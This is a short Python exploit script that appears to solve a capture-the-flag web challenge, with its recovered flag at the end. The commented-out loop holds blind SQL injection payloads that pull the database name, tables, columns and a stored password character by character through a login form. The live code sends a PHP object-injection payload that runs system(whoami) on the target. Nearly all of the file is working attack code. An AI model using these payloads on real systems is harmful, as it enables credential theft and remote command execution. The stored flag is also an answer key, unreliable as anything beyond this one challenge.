from string import printable
from time import sleep

import requests

BASE_URL = "http://143.198.200.16:50621/logins.php"
FLAG_URL = "http://143.198.200.16:50621/fl4g.php"

charset = " " + printable

# blind mysqli version 8
"""
db: web_blindsql
table: user
column: 
username
passw0rd
"""
index = 1
leaked = ""
# while True:
#     for idx, char in enumerate(charset):
#         body = {
#             "username": "a",
#             # "passw0rd": f"a' OR (SELECT SUBSTR(database(),{index},1) = '{char}') -- - ",
#             # "passw0rd": f"a' OR mid((SELECT table_name FROM information_schema.tables WHERE table_schema = 'web_blindsql' LIMIT 1 OFFSET 1),{index},1) = '{char}' -- - ",
#             # "passw0rd": f"a' OR mid((SELECT column_name FROM information_schema.columns WHERE table_schema = 'web_blindsql' LIMIT 1 OFFSET 2),{index},1) = '{char}' -- - ",
#             "passw0rd": f"a' OR mid((SELECT passw0rd FROM web_blindsql.user LIMIT 1 OFFSET 0),{index},1) = '{char}' -- - ",
#         }

#         r = requests.post(BASE_URL, data=body)

#         # print(r.text)

#         if "Welcome!" in r.text:
#             leaked += char
#             index += 1
#             print("Leaked:", leaked)
#             break

#         if idx >= len(charset) - 1:
#             exit(1)

data = {"r": """O:8:"suntikan":1:{s:6:"inject";s:15:"system(whoami);";}"""}
r = requests.post(FLAG_URL, data=data)
print(r.text)

# FindITCTF{Bl1nd_S3kUre_W3b_k3r3N_Ab!ez}
